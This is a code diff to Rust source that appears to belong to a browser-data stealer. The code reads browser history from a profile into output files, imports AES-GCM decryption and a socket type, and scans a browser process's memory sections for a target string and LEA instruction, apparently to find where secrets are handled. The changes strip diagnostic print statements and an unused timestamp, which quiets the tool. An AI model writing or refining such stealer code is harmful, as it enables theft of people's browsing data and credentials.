@@ -14,7 +14,6 @@ use std::fs;
 use std::io::{Read, Write};
 use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
 use rusqlite::Connection;
-use chrono::Utc;
 use base64::Engine;
 
 use crate::Sock;
@@ -551,8 +550,7 @@ fn extract_history(profile_path: &Path, output_dir: &Path, temp_prefix: &str) {
                     row.get::<_, i64>(3)?,
                 ))).unwrap();
                 for row in rows.flatten() {
-                    let (url, title, count, _time) = row;
-                    let _dt = Utc::now();
+                    let (url, title, count, _) = row;
                     let _ = writeln!(file, "URL: {} | Title: {} | Visits: {}", url, title, count);
                 }
             }
@@ -674,7 +672,6 @@ unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_voi
     }
 
     if string_va == 0 {
-        println!("Could not find target string in {}'s .rdata section", browser_name);
         return 0;
     }
 
@@ -695,7 +692,6 @@ unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_voi
                     let rip = section_start + pos + 7;
                     let target = (rip as i64 + offset as i64) as usize;
                     if target == string_va {
-                        println!("Found matching LEA instruction at 0x{:X} for {}", section_start + pos, browser_name);
                         return section_start + pos;
                     }
                 }
@@ -704,7 +700,6 @@ unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_voi
         }
     }
 
-    println!("Could not find matching LEA instruction in {}'s .text section", browser_name);
     0
 }
 
